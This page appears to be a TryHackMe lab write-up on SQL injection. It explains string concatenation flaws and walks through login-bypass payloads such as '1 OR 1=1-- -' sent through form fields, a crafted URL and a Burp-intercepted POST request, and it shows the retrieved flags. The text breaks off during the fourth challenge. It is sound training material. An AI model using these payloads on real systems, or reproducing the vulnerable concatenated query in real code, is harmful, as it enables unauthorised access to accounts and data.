  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../sqlinjection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SQL Injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    SQL Injection Lab
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    SQL Injection Lab
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#resources" class="md-nav__link">
    <span class="md-ellipsis">
      Resources
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#introduction-to-sql-injection" class="md-nav__link">
    <span class="md-ellipsis">
      Introduction to SQL Injection
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Introduction to SQL Injection">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sql-injection-1-input-box-non-string" class="md-nav__link">
    <span class="md-ellipsis">
      SQL Injection 1: Input Box Non-String
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sql-injection-2-input-box-string" class="md-nav__link">
    <span class="md-ellipsis">
      SQL Injection 2: Input Box String
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sql-injection-3-url-injection" class="md-nav__link">
    <span class="md-ellipsis">
      SQL Injection 3: URL Injection
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sql-injection-4-post-injection" class="md-nav__link">
    <span class="md-ellipsis">
      SQL Injection 4: POST Injection
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sql-injection-5-update-statement" class="md-nav__link">
    <span class="md-ellipsis">
      SQL Injection 5: UPDATE Statement
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#vulnerable-startup-broken-authentication" class="md-nav__link">
    <span class="md-ellipsis">
      Vulnerable Startup: Broken Authentication
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Vulnerable Startup: Broken Authentication">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#vulnerable-startup-broken-authentication-2" class="md-nav__link">
    <span class="md-ellipsis">
      Vulnerable Startup: Broken Authentication 2
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerable-startup-broken-authentication-3-blind-injection" class="md-nav__link">
    <span class="md-ellipsis">
      Vulnerable Startup: Broken Authentication 3 (Blind Injection)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerable-startup-vulnerable-notes" class="md-nav__link">
    <span class="md-ellipsis">
      Vulnerable Startup: Vulnerable Notes
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerable-startup-change-password" class="md-nav__link">
    <span class="md-ellipsis">
      Vulnerable Startup: Change Password
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerable-startup-book-title" class="md-nav__link">
    <span class="md-ellipsis">
      Vulnerable Startup: Book Title
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerable-startup-book-title-2" class="md-nav__link">
    <span class="md-ellipsis">
      Vulnerable Startup: Book Title 2
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ssrf/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SSRF
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../steelmountain/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Steel Mountain
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../subdomainenumeration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Subdomain Enumeration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../traverse/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Traverse
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../uploadvulnerabilities/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Upload Vulnerabilities
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../vulnversity/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Vulnversity
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../whattheshell/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    What the Shell?
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#resources" class="md-nav__link">
    <span class="md-ellipsis">
      Resources
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#introduction-to-sql-injection" class="md-nav__link">
    <span class="md-ellipsis">
      Introduction to SQL Injection
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Introduction to SQL Injection">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sql-injection-1-input-box-non-string" class="md-nav__link">
    <span class="md-ellipsis">
      SQL Injection 1: Input Box Non-String
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sql-injection-2-input-box-string" class="md-nav__link">
    <span class="md-ellipsis">
      SQL Injection 2: Input Box String
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sql-injection-3-url-injection" class="md-nav__link">
    <span class="md-ellipsis">
      SQL Injection 3: URL Injection
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sql-injection-4-post-injection" class="md-nav__link">
    <span class="md-ellipsis">
      SQL Injection 4: POST Injection
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sql-injection-5-update-statement" class="md-nav__link">
    <span class="md-ellipsis">
      SQL Injection 5: UPDATE Statement
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#vulnerable-startup-broken-authentication" class="md-nav__link">
    <span class="md-ellipsis">
      Vulnerable Startup: Broken Authentication
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Vulnerable Startup: Broken Authentication">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#vulnerable-startup-broken-authentication-2" class="md-nav__link">
    <span class="md-ellipsis">
      Vulnerable Startup: Broken Authentication 2
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerable-startup-broken-authentication-3-blind-injection" class="md-nav__link">
    <span class="md-ellipsis">
      Vulnerable Startup: Broken Authentication 3 (Blind Injection)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerable-startup-vulnerable-notes" class="md-nav__link">
    <span class="md-ellipsis">
      Vulnerable Startup: Vulnerable Notes
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerable-startup-change-password" class="md-nav__link">
    <span class="md-ellipsis">
      Vulnerable Startup: Change Password
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerable-startup-book-title" class="md-nav__link">
    <span class="md-ellipsis">
      Vulnerable Startup: Book Title
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerable-startup-book-title-2" class="md-nav__link">
    <span class="md-ellipsis">
      Vulnerable Startup: Book Title 2
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


  <h1>SQL Injection Lab</h1>

<h2 id="resources">Resources<a class="headerlink" href="#resources" title="Permanent link">&para;</a></h2>
<p>Following a list of useful resources and cheat sheets related to SQL Injection.</p>
<ul>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">PortSwigger - SQL Injection Cheat Sheet</a></li>
<li><a href="https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/SQL%20Injection/">Payload All the Things - SQL Injection</a></li>
<li><a href="https://websec.ca/kb/sql_injection">Websec - SQL Injection</a></li>
<li><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection">HackTricks - SQL Injection</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">OWASP - SQL Injection Prevention</a></li>
</ul>
<h2 id="introduction-to-sql-injection">Introduction to SQL Injection<a class="headerlink" href="#introduction-to-sql-injection" title="Permanent link">&para;</a></h2>
<p>This room provides and introduction to SQL injection and demonstrates various SQL Injection attacks.</p>
<p>SQL injection is a technique through which attackers can execute their own malicious SQL statements thereby allowing changes to the backend database or worse theft of personal identifiable information and credentials.</p>
<p>Web applications typically need dynamic SQL queries in order to display content to an end-user. In order to allow dynamic SQL queries, web developers often concatenate user inputs directly into SQL statements. Without sufficient input validation or use of secure coding practices, string concatenation becomes the most common mistake that leads to SQL injection vulnerability.</p>
<p>Take for example the following PHP code which demonstrates a dynamic SQL query in a login form:</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="x">$query = &quot;SELECT * FROM users WHERE username=&#39;&quot; + $_POST[&quot;user&quot;] + &quot;&#39; AND password=&#39;&quot; + $_POST[&quot;password&quot;]$ + &#39;&quot;;&quot;</span>
</code></pre></div>
In the above example code, providing the value <code>' OR 1=1-- -</code> inside the username parameter can force the database to execute the SQL statement and return all the users in the users table. In essence, the attacker is able to bypass the application's authentication mechanism and is logged in as the first user returned by the query. This is because the addition of the <code>' OR 1=1--</code> in the name parameter results in the the following SQL query:</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">-- -&#39; AND password = &#39;&#39;</span>
</code></pre></div>
The reason for using <code>-- -</code> instead of <code>--</code> is primarily because MySQL's double-dash comment style requires the second dash to be followed by at least one whitespace or control character (such as a space, tab, newline, etc.).</p>
<h3 id="sql-injection-1-input-box-non-string">SQL Injection 1: Input Box Non-String<a class="headerlink" href="#sql-injection-1-input-box-non-string" title="Permanent link">&para;</a></h3>
<p>When logging in, the application performs the following query:</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">uid</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">profileID</span><span class="p">,</span><span class="w"> </span><span class="n">salary</span><span class="p">,</span><span class="w"> </span><span class="n">passportNr</span><span class="p">,</span><span class="w"> </span><span class="n">email</span><span class="p">,</span><span class="w"> </span><span class="n">nickName</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">usertable</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">profileID</span><span class="o">=</span><span class="mi">10</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;ce5ca67...&#39;</span>
</code></pre></div>
For this challenge, the application accepts user supplied input for profileID as an integer (ie. <code>profileID=10</code>). Since inputs by the user are not being sanitized, we can bypass any authentication attempts by injecting a modified query into the profileID field which always returns a TRUE condition (ie. <code>1 OR 1=1-- -</code>). The password can be any random string.</p>
<p><img alt="SQL Injection 1: Input Box Non-String" src="../../../assets/images/thm/sqlilab/01%20-%20sqli1%20-%20input%20box%20non-string.png" /></p>
<p><br></p>
<p>Injecting the malicious payload above allows us to bypass any authentication measures presented by the web application and log in as the first result returned.</p>
<p><img alt="SQL Injection 1: Input Box Non-String Auth Pass" src="../../../assets/images/thm/sqlilab/02%20-%20sqli1%20-%20input%20box%20non-string.png" /></p>
<p><br></p>
<p>Notice the resultant SQL query. Everything after the <code>1 OR 1=1-- -</code> statement is converted into a comment and thereby ignored by the database server when executing the query.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">uid</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">profileID</span><span class="p">,</span><span class="w"> </span><span class="n">salary</span><span class="p">,</span><span class="w"> </span><span class="n">passportNr</span><span class="p">,</span><span class="w"> </span><span class="n">email</span><span class="p">,</span><span class="w"> </span><span class="n">nickName</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">usertable</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">profileID</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">-- - AND password = &#39;ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb&#39;</span>
</code></pre></div>
Retried Flag: <code>THM{dccea429d73d4a6b4f117ac64724f460}</code></p>
<h3 id="sql-injection-2-input-box-string">SQL Injection 2: Input Box String<a class="headerlink" href="#sql-injection-2-input-box-string" title="Permanent link">&para;</a></h3>
<p>This challenge uses the same query as in the previous challenge however the parameter expects a string instead of an integer (ie. `profileID='10').</p>
<p>Since the query expects a string, we can modify our payload as follows to bypass the authentication mechanism. Again, the password field can be a random value.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="mi">1</span><span class="err">&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">-- -</span>
</code></pre></div>
<img alt="SQLi Injection 2: Input Box String" src="../../../assets/images/thm/sqlilab/03%20-%20sqli2%20-%20input%20box%20string.png" /></p>
<p>The executed SQL query is as follows. Notice how everything after the <code>1' OR 1=1-- -'</code> statement is converted into a comment and thereby ignored by the SQL server during query execution. Since the password check is not executed due to the modified query, our payload allows us to bypass the authentication check which is normally performed by the backend server.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">uid</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">profileID</span><span class="p">,</span><span class="w"> </span><span class="n">salary</span><span class="p">,</span><span class="w"> </span><span class="n">passportNr</span><span class="p">,</span><span class="w"> </span><span class="n">email</span><span class="p">,</span><span class="w"> </span><span class="n">nickName</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">usertable</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">profileID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">-- -&#39; AND password = &#39;ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb&#39;</span>
</code></pre></div>
<br></p>
<p><img alt="SQLi Injection 2: Input Box String Auth Pass" src="../../../assets/images/thm/sqlilab/04%20-%20sqli2%20-%20input%20box%20string.png" /></p>
<p><br></p>
<p>Retrieved Flag: <code>THM{356e9de6016b9ac34e02df99a5f755ba}</code></p>
<h3 id="sql-injection-3-url-injection">SQL Injection 3: URL Injection<a class="headerlink" href="#sql-injection-3-url-injection" title="Permanent link">&para;</a></h3>
<p>This challenge implements client-side controls to prevent malicious user inputs from being injected directly into the application via the login form. The JavaScript code below requires both the profileID and the password fields to only contain characters between a-z, A-Z and 0-9. </p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="kd">function</span><span class="w"> </span><span class="nx">validateform</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">profileID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">inputForm</span><span class="p">.</span><span class="nx">profileID</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">inputForm</span><span class="p">.</span><span class="nx">password</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>
<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="sr">/^[a-zA-Z0-9]*$/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">profileID</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">false</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="sr">/^[a-zA-Z0-9]*$/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">password</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">false</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="w">        </span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;The input fields cannot contain special characters&quot;</span><span class="p">);</span>
<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">profileID</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="w">        </span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;The input fields cannot be empty.&quot;</span><span class="p">);</span>
<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="p">}</span>
</code></pre></div>
Note that client-side controls are only there to improve the user experience and should not be used as a security feature as the user has full control over the client and data it submits.</p>
<p>Notice how we get an error message when we try to inject a special character into the login form.</p>
<p><img alt="SQL Injection 3: URL Injection Message" src="../../../assets/images/thm/sqlilab/05%20-%20sqli3%20-%20URL%20Injection.png" /></p>
<p>Since we can't inject special characters, let's try a random profileID and password to see if we can find another vector. Trying inputs <code>test:test</code> results in a message indicating that the account information provided does not exist. However, it looks like the web application is making a GET request to the database server which contains the profileID and password in the URL field.</p>
<p><img alt="SQL Injection 3: URL Injection GET Method" src="../../../assets/images/thm/sqlilab/06%20-%20sqli3%20-%20URL%20Injection.png" /></p>
<p>Let's inject our malicious query into the URL.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>http://10.10.158.53:5000/sesqli3/login?profileID=test&#39; OR 1=1-- -&amp;password=test
</code></pre></div>
The resultant executed query is as follows:</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">uid</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">profileID</span><span class="p">,</span><span class="w"> </span><span class="n">salary</span><span class="p">,</span><span class="w"> </span><span class="n">passportNr</span><span class="p">,</span><span class="w"> </span><span class="n">email</span><span class="p">,</span><span class="w"> </span><span class="n">nickName</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">usertable</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">profileID</span><span class="o">=</span><span class="s1">&#39;test&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">-- -&#39; AND password=&#39;9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08&#39;</span>
</code></pre></div>
Notice once again how everything after the <code>' OR 1=1-- -</code> statement is converted into a comment and thereby the password validation is never executed thus allowing us to bypass the authentication check completely.</p>
<p><img alt="SQL Injection 3: URL Injection GET Method Auth Pass" src="../../../assets/images/thm/sqlilab/07%20-%20sqli3%20-%20URL%20injection.png" /></p>
<p><br></p>
<p>Retrieved Flag: <code>THM{645eab5d34f81981f5705de54e8a9c36}</code></p>
<h3 id="sql-injection-4-post-injection">SQL Injection 4: POST Injection<a class="headerlink" href="#sql-injection-4-post-injection" title="Permanent link">&para;</a></h3>
<p>Similar to the previous challenge, this challenge implements client-side controls to limit the input characters to alpha-numeric thereby preventing direct injection in the login form fields using special characters. Furthermore, unlike the last challenge, this challenge uses the POST method when submitting credentials.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;login-form&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;/sesqli4/login&quot;</span> <span class="na">onsubmit</span><span class="o">=</span><span class="s">&quot;return validateform()&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;inputForm&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>        <span class="p">&lt;</span><span class="nt">h2</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;</span>Log in<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-group&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-control&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;ProfileID&quot;</span> <span class="na">required</span><span class="o">=</span><span class="s">&quot;required&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;profileID&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-group&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-control&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;Password&quot;</span> <span class="na">required</span><span class="o">=</span><span class="s">&quot;required&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;password&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-group&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>            <span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;btn btn-primary btn-block&quot;</span><span class="p">&gt;</span>Log in<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
<a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</code></pre></div>
In this case, we cannot simply inject malicious strings into the login fields or manipulate the URL like in the previous challenge. Since, this challenge uses the POST method to make HTTP requests, we may be able to intercept the request using a proxy like BurpSuite.</p>
<p>Open BurpSuite and ensure Intercept is enabled (don't forget to configure the browser to use the Burp proxy using FoxyProxy!)</p>
<p><img alt="SQL Injection 4: POST Injection Burp" src="../../../assets/images/thm/sqlilab/08%20-%20sqli3%20-%20post%20injection.png" /></p>
<p><br></p>
<p><img alt="SQL Injection 4: POST Injection Burp Intercept" src="../../../assets/images/thm/sqlilab/09%20-%20sqli3%20-%20post%20injection.png" /></p>
<p><br></p>
<p>With the request intercepted, modify the profileID to include the malicious statement and forward the request to the server. Ensure to URL encode the modified statement before sending a request (CTRL + u).</p>
<p><img alt="SQL Injection 4: POST Injection Burp Payload" src="../../../assets/images/thm/sqlilab/10%20-%20sqli3%20-%20post%20injection.png" /></p>
<p><br></p>
<p>Looks like the payload execution was successful as we are able to bypass authentication check as well as the client-side filtering to log in as the first user data retrieved.</p>
<p><img alt="SQL Injection 4: POST Injection Burp Auth Pass" src="../../../assets/images/thm/sqlilab/11%20-%20sqli3%20-%20post%20injection.png" /></p>
<p><br></p>
<p>The executed query on the back end is as follows.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">uid</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">profileID</span><span class="p">,</span><span class="w"> </span><span class="n">salary</span><span class="p">,</span><span class="w"> </span><span class="n">passportNr</span><span class="p">,</span><span class="w"> </span><span class="n">email</span><span class="p">,</span><span class="w"> </span><span class="n">nickName</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">usertable</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">profileID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;test&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="mi">1</span><span 